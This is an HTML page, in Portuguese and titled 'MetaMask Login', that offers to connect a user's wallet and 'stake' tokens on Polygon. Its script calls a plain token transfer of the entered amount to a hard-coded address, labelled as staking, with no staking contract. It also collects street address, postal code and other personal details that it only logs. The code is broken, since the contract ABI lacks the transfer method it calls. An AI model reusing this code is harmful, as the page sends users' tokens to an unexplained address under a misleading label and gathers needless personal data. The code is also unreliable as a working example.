<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MetaMask Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f4f4f9;
      font-family: 'Arial', sans-serif;
      flex-direction: column;
      background-image: url('https://img.freepik.com/fotos-gratis/fundo-de-papel-de-parede-colorido-embacado-artistico_58702-8367.jpg');
      background-size: cover;
      background-attachment: fixed;
      background-position: center;
    }

    #walletInfo {
      position: fixed;
      top: 220px;
      left: 110px;
      background-color: rgba(255, 255, 255, 0.7);
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      font-size: 16px;
      text-align: center;
      z-index: 10;
    }

    .button-container {
      position: fixed;
      top: 40px;
      right: 20px;
      display: flex;
      flex-direction: row;
      gap: 10px;
      z-index: 10;
    }

    #connectButton {
      background-color: #4CAF50;
      color: white;
      font-size: 16px;
      padding: 12px 25px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }

    #connectButton:hover {
      background-color: #45a049;
    }

    #stakeForm {
      margin-top: 50px;
      padding: 20px;
      background-color: rgba(255, 255, 255, 0.8);
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      display: flex;
      flex-direction: column;
      width: 300px;
    }

    #stakeForm input, #stakeForm select {
      margin-bottom: 10px;
      padding: 10px;
      font-size: 14px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    #stakeButton {
      background-color: #4CAF50;
      color: white;
      padding: 12px;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    #stakeButton:hover {
      background-color: #45a049;
    }

    #errorMessage {
      color: red;
      font-size: 16px;
      margin-top: 10px;
      text-align: center;
      display: block;
      opacity: 0;
      visibility: hidden;
      transition: opacity 3s ease-out, visibility 3s ease-out;
    }

    #errorMessage.show {
      opacity: 1;
      visibility: visible;
    }

    /* Animação dos três pontos */
    .dots::after {
      content: '';
      animation: dots 1.5s infinite;
    }

    @keyframes dots {
      0% { content: ''; }
      33% { content: '.'; }
      66% { content: '..'; }
      100% { content: '...'; }
    }

  </style>
</head>
<body>

  <div id="walletInfo">
    Conta: Esperando conexão <span class="dots"></span>
  </div>

  <div class="button-container">
    <button id="connectButton">Conecte sua carteira</button>
  </div>

  <div id="stakeForm" style="display: none;">
    <h3>Faça o seu Stake!</h3>
    <input type="number" id="amount" placeholder="Quantos tokens?" min="1" required>
    <input type="text" id="address" placeholder="Endereço" required>
    <input type="text" id="number" placeholder="Número" required>
    <input type="text" id="city" placeholder="Cidade" required>
    <input type="text" id="state" placeholder="Estado" required>
    <input type="text" id="cep" placeholder="CEP" required>
    <input type="text" id="team" placeholder="Time do coração" required>
    <button id="stakeButton">Confirmar Stake</button>
  </div>

  <div id="errorMessage">
    <p>Erro ao conectar ou recuperar o saldo! Verifique sua MetaMask e rede.</p>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
  <script>
    const connectButton = document.getElementById('connectButton');
    const stakeForm = document.getElementById('stakeForm');
    const stakeButton = document.getElementById('stakeButton');
    const errorMessage = document.getElementById('errorMessage');
    const walletInfo = document.getElementById('walletInfo');

    const tokenAddress = "0x87E43F6667799478dC819ca400349189B505AEd1";
    const polygonMainnetChainId = "0x89";
    const stakingAddress = "0x8180c6Ab37625c259F35503899e0eC66446Dcf1D";

    // Connect MetaMask
    async function connectMetaMask() {
      if (typeof window.ethereum !== 'undefined') {
        try {
          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
          const account = accounts[0];
          walletInfo.innerText = `Carteira conectada: ${account.substring(0, 7)}...${account.substring(account.length - 5)}`;
          stakeForm.style.display = 'block';
          connectButton.innerText = 'Carteira conectada';
          connectButton.style.backgroundColor = '#4CAF50';

          const chainId = await ethereum.request({ method: 'eth_chainId' });
          if (chainId !== polygonMainnetChainId) {
            alert("Você não está na Polygon Mainnet. Mudando para a Polygon Mainnet...");
            await switchToPolygonMainnet();
            return;
          }
        } catch (error) {
          console.error("Erro ao conectar:", error);
          errorMessage.classList.add('show');
          setTimeout(() => { errorMessage.classList.remove('show'); }, 3000);
        }
      } else {
        alert('Por favor, instale o MetaMask!');
      }
    }

    // Função para mudar para a Polygon Mainnet
    async function switchToPolygonMainnet() {
      await ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: polygonMainnetChainId }],
      });
    }

    // Função para enviar os tokens para o stake
    async function handleStake() {
      // Validação dos campos obrigatórios
      const amount = document.getElementById('amount').value;
      const address = document.getElementById('address').value;
      const number = document.getElementById('number').value;
      const city = document.getElementById('city').value;
      const state = document.getElementById('state').value;
      const cep = document.getElementById('cep').value;
      const team = document.getElementById('team').value;

      if (!amount || !address || !number || !city || !state || !cep || !team) {
        alert("Por favor, preencha todos os campos.");
        return;
      }

      // Informações do usuário (isso seria salvo no banco de dados)
      const userInfo = { address, number, city, state, cep, team };

      // Lógica para transferir os tokens para o endereço de staking
      const web3 = new Web3(window.ethereum);
      const tokenContract = new web3.eth.Contract([{ "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" }], tokenAddress);
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });

      const amountInWei = web3.utils.toWei(amount, 'ether');
      await tokenContract.methods.transfer(stakingAddress, amountInWei).send({ from: accounts[0] });

      // Salvar as informações do usuário (aqui você conectaria ao seu banco de dados)
      console.log("Informações do usuário para o stake:", userInfo);

      alert("Stake realizado com sucesso!");
    }

    // Evento de clique para conectar a MetaMask
    connectButton.addEventListener('click', connectMetaMask);
    // Evento de clique para realizar o stake
    stakeButton.addEventListener('click', handleStake);
  </script>
</body>
</html>
